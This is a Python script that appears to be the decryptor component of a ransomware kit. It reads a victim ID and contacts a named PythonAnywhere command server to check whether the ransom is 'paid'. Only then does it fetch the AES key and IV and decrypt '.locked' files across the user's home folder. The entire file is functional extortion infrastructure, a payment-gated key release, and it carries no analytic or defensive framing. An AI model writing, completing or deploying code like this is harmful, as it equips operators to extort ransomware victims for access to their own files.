#!/usr/bin/env python3
"""
Decryption Tool for Advanced Ransomware
- Connects to PythonAnywhere server
- Retrieves AES key and IV
- Decrypts all .locked files
"""

import os
import sys
import base64
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# --- Configuration ---
SERVER_URL = "https://shadow1234.pythonanywhere.com/"

class DecryptionTool:
    def __init__(self):
        self.victim_id = None
        self.key_hex = None
        self.iv_hex = None
        
    def get_victim_id(self):
        # In a real scenario, this might be passed as an argument or read from a file
        # For now, we ask the user or read from a config file
        # Here, we assume the user has a file 'victim_id.txt' created by the ransomware
        try:
            with open("victim_id.txt", "r") as f:
                self.victim_id = f.read().strip()
        except FileNotFoundError:
            self.victim_id = input("Enter your Victim ID: ").strip()
            
        if not self.victim_id:
            print("[-] Victim ID required.")
            sys.exit(1)

    def fetch_keys(self):
        try:
            response = requests.get(SERVER_URL + f"check_payment/{self.victim_id}")
            data = response.json()
            
            if not data.get("paid"):
                print("[-] Payment not confirmed yet. Please wait.")
                sys.exit(1)
                
            self.key_hex = data.get("key")
            self.iv_hex = data.get("iv")
            
            if not self.key_hex or not self.iv_hex:
                print("[-] Keys not found.")
                sys.exit(1)
                
            print("[+] Keys received successfully.")
            
        except Exception as e:
            print(f"[-] Error fetching keys: {e}")
            sys.exit(1)

    def decrypt_file(self, filepath):
        try:
            key = bytes.fromhex(self.key_hex)
            iv = bytes.fromhex(self.iv_hex)
            
            with open(filepath, 'rb') as f:
                ciphertext = f.read()
            
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            
            original_path = filepath.replace(".locked", "")
            with open(original_path, 'wb') as f:
                f.write(plaintext)
            
            os.remove(filepath)
            print(f"[+] Decrypted: {original_path}")
            
        except Exception as e:
            print(f"[-] Failed to decrypt {filepath}: {e}")

    def find_locked_files(self, start_path):
        locked_files = []
        for root, dirs, files in os.walk(start_path):
            # Skip system folders
            if any(sys_dir in root.lower() for sys_dir in ["windows", "program files", "recycle.bin", "appdata\local\temp"]):
                continue
            for filename in files:
                if filename.endswith(".locked"):
                    locked_files.append(os.path.join(root, filename))
        return locked_files

    def run(self):
        print("[*] Starting Decryption Tool...")
        self.get_victim_id()
        self.fetch_keys()
        
        locked_files = self.find_locked_files(os.path.expanduser("~"))
        print(f"[+] Found {len(locked_files)} encrypted files.")
        
        for f in locked_files:
            self.decrypt_file(f)
            
        print("[+] Decryption Complete!")

if __name__ == "__main__":
    DecryptionTool().run()
